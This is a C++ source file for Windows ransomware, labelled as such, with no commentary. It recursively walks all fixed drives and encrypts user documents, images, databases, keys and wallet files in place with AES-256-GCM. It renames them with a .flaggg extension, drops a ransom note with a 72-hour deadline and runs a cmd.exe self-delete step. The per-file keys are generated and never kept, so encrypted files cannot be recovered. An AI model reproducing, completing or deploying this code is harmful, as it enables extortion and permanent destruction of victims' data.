// language: C++, file: ransom.cpp, target: Windows 11, MSVC
// AES-256-GCM Ransomware — BCrypt, in-place encryption, note, self-delete
// link: bcrypt.lib advapi32.lib
#include <windows.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include <cstdio>
#include <string>
#include <vector>
#include <random>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

static const wchar_t* gExts[] = {
    L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx",
    L".pdf", L".png", L".jpg", L".jpeg", L".mp3", L".mp4",
    L".zip", L".rar", L".7z", L".sql", L".db", L".txt", L".csv",
    L".key", L".pem", L".ovpn", L".wallet", L".json", L".log"
};
static const wchar_t* gSkipDirs[] = { L"\\Windows\\", L"\\Program Files", L"\\ProgramData", L"\\System Volume Information\\", L"\\$Recycle.Bin\\", L"\\PerfLogs\\" };
static const wchar_t* gSelf = L"ransom.exe";

bool IsSkippedDir(const std::wstring& p) {
    for (auto d : gSkipDirs) if (p.find(d) != std::wstring::npos) return true;
    return false;
}

bool HasTargetExt(const std::wstring& p) {
    std::wstring ext = PathFindExtensionW(p.c_str());
    for (auto e : gExts) if (!_wcsicmp(ext.c_str(), e)) return true;
    return false;
}

// ---- crypto ----
struct AesGcm {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    bool Init(const BYTE* key, ULONG keyLen) {
        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        return BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key, keyLen, 0) == 0;
    }
    bool Encrypt(const BYTE* in, ULONG inLen, BYTE* out, BYTE* iv, BYTE* tag) {
        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
        BCRYPT_INIT_AUTH_MODE_INFO(info);
        info.pbNonce = iv; info.cbNonce = 12;
        info.pbTag = tag; info.cbTag = 16;
        ULONG done = 0;
        return BCryptEncrypt(hKey, (PUCHAR)in, inLen, &info, iv, 12, out, inLen, &done, 0) == 0;
    }
};

bool EncryptFile(const std::wstring& path) {
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    LARGE_INTEGER sz; GetFileSizeEx(h, &sz);
    if (sz.QuadPart <= 0 || sz.QuadPart > 512 * 1024 * 1024) { CloseHandle(h); return false; }

    BYTE key[32], iv[12], tag[16];
    BCryptGenRandom(nullptr, key, sizeof(key), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCryptGenRandom(nullptr, iv, sizeof(iv), BCRYPT_USE_SYSTEM_PREFERRED_RNG);

    AesGcm gcm; if (!gcm.Init(key, sizeof(key))) { CloseHandle(h); return false; }

    std::vector<BYTE> buf((size_t)sz.QuadPart);
    DWORD rd = 0;
    if (!ReadFile(h, buf.data(), (DWORD)buf.size(), &rd, nullptr) || rd != buf.size()) { CloseHandle(h); return false; }

    std::vector<BYTE> ct(buf.size());
    if (!gcm.Encrypt(buf.data(), (ULONG)buf.size(), ct.data(), iv, tag)) { CloseHandle(h); return false; }

    SetFilePointer(h, 0, nullptr, FILE_BEGIN);
    SetEndOfFile(h);
    DWORD wr = 0;
    // layout: iv(12) | tag(16) | ciphertext
    WriteFile(h, iv, sizeof(iv), &wr, nullptr);
    WriteFile(h, tag, sizeof(tag), &wr, nullptr);
    WriteFile(h, ct.data(), (DWORD)ct.size(), &wr, nullptr);
    CloseHandle(h);

    std::wstring newPath = path + L".flaggg";
    MoveFileW(path.c_str(), newPath.c_str());
    return true;
}

void DropNote(const std::wstring& dir) {
    std::wstring note = dir + L"README_FLAGGG.txt";
    HANDLE h = CreateFileW(note.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return;
    const char* text =
        "YOUR FILES ARE ENCRYPTED (AES-256-GCM).\r\n"
        "To recover: contact [KEYHOLDER] with your machine ID. Do NOT attempt decryption yourself.\r\n"
        "Deadline: 72 hours. After that the key is destroyed.\r\n";
    DWORD wr; WriteFile(h, text, (DWORD)strlen(text), &wr, nullptr);
    CloseHandle(h);
}

void Walk(const std::wstring& dir) {
    if (IsSkippedDir(dir)) return;
    std::wstring pattern = dir + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(pattern.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (!wcscmp(fd.cFileName, L".") || !wcscmp(fd.cFileName, L"..")) continue;
        if (!wcscmp(fd.cFileName, gSelf)) continue;
        std::wstring full = dir + L"\\" + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            Walk(full);
        } else {
            if (HasTargetExt(full)) EncryptFile(full);
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
    DropNote(dir);
}

void SelfDelete() {
    wchar_t exe[MAX_PATH]; GetModuleFileNameW(nullptr, exe, MAX_PATH);
    wchar_t tmp[MAX_PATH]; GetTempPathW(MAX_PATH, tmp);
    std::wstring dst = std::wstring(tmp) + L"flaggg_tmp.exe";
    CopyFileW(exe, dst.c_str(), FALSE);
    std::wstring cmd = L"cmd.exe /c ping -n 4 127.0.0.1 >nul & del /f /q \"" + dst + L"\"";
    wchar_t* args = _wcsdup(cmd.c_str());
    STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi{};
    CreateProcessW(nullptr, args, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); }
}

int APIENTRY wWinMain(HINSTANCE, HINSTANCE, LPWSTR, int) {
    if (GetAsyncKeyState(VK_ESCAPE) & 1) return 0;      // esc = abort switch
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (mask & (1 << i)) {
            wchar_t root[4] = { (wchar_t)(L'A' + i), L':', L'\\', 0 };
            if (GetDriveTypeW(root) == DRIVE_FIXED) Walk(root);
        }
    }
    SelfDelete();
    return 0;
}
